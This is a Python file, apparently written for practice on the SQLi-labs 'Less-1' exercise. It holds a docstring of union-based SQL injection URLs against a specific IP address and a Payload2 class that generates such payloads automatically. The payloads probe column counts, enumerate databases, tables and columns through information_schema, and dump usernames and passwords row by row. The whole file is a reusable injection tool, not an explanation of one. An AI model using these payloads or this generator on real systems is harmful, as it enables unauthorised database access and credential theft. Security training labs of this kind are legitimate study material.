'''
#union sqlinjection

    #查询有几列 id=a ,order by b
    http://47.95.4.158:8002/Less-1/?id=1' order by 3 --+

    #查询有几列回显 id=a ,order by 111 222 333 ... bbb
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,33 --+

    #查询库实例名 id=a , select 11 ... group_concat(schema_name) ... bbb 
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,group_concat(schema_name) from information_schema.schemata --+

    #查询库的表名 id=a , select 11 ... group_concat(table_name) ... bbb , table_schema = 'c'
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,group_concat(table_name) from information_schema.tables where table_schema = 'security' --+

    #查询表的列名 id=a , select 11 ... group_concat(column_name) ... bbb , table_schema = 'c' , table_name = 'd'
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users' --+

    #查询数据 id=a , select 11 ... group_concat(list) ... bbb , from c.d
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,group_concat(id,0x20,username,0x20,password) from security.users --+

way 2:
    
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,schema_name from information_schema.schemata limit 0,1 --+

    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,table_name from information_schema.tables where table_schema = 'security' limit 0,1 --+
   
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,column_name from information_schema.columns where table_schema = 'security' and table_name = 'users' limit 0,1 --+

    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,id from security.users limit 0,1 --+

'''

'''
count_list
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,count(schema_name) from information_schema.schemata --+
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,count(table_name) from information_schema.tables where table_schema = 'security' --+
    http://47.95.4.158:8002/Less-1/?id=1' and 1=2 union select 11,22,count(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users' --+

'''


class Payload2():
    pre_payload = '' # payload 前缀，用于引号闭合

    def __init__(self,pre_payload):
        self.pre_payload = pre_payload

    def order_by(self, a):        #传入order by所需的列数
        a = str(a)
        return self.pre_payload + ' order by '+a+' --+'

    def order_list(self, b):      #传入回显列数中的随机数
        list1 = [str(i) for i in b]
        list2 = ','.join(list1)
        return self.pre_payload + ' and 1=2 union select '+list2+' --+'

    def union_sql(self, num1 = None,num2 = None, schema_name = '',table_name = '',column_name = []):
        if num1 == None or num2 == None:
            print("Error,please input num1 and num2.")
            return -1

        elif schema_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('group_concat(schema_name) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ', '.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.schemata  --+'

        elif table_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('group_concat(table_name) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.tables where table_schema = \'' +schema_name + '\'--+'

        elif len(column_name) == 0:
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('group_concat(column_name) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.columns where table_schema = \'' +schema_name+'\' and table_name = \''+ table_name+ '\'--+' 

        else:
            list4 = [str(i) for i in column_name]
            list5 = ',0x60,'.join(list4)
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('group_concat('+list5+') ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from '+schema_name+'.'+table_name + ' --+'

    def count_list(self,num1 = None,num2 = None, schema_name = '',table_name = '',column_name = ''):
        if num1 == None or num2 == None:
            print("Error,please input num1 and num2.")
            return -1

        elif schema_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('count(schema_name) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ', '.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.schemata  --+'

        elif table_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('count(table_name) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.tables where table_schema = \'' +schema_name + '\'--+'

        elif column_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('count(column_name) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.columns where table_schema = \'' +schema_name+'\' and table_name = \''+ table_name+ '\'--+' 

        else:
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('count(*) ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from '+schema_name+'.'+table_name + ' --+'

    def union_sql_2(self,num1 = None,num2 = None, schema_name = '',table_name = '',column_name = '',num3 = None):
        if num1 == None or num2 == None or num3 == None:
            print("Error,please input num1 and num2 and num3.")
            return -1

        elif schema_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('schema_name ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ', '.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.schemata  limit '+str(num3)+',1 --+'

        elif table_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('table_name ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.tables where table_schema = \'' +schema_name + '\' limit '+str(num3)+',1 --+'

        elif column_name == '':
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append('column_name ')
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.columns where table_schema = \'' +schema_name+'\' and table_name = \''+ table_name+ '\' limit '+str(num3)+',1 --+' 

        else:
            list3 = []
            for i in range(num1):
                if i == num2-1:
                    list3.append(column_name)
                else:
                    list3.append(i)
            list1 = [str(i) for i in list3]
            list2 = ','.join(list1)
            return self.pre_payload + ' and 1=2 union select '+list2+' from '+schema_name+'.'+table_name + ' limit '+str(num3)+',1 --+'
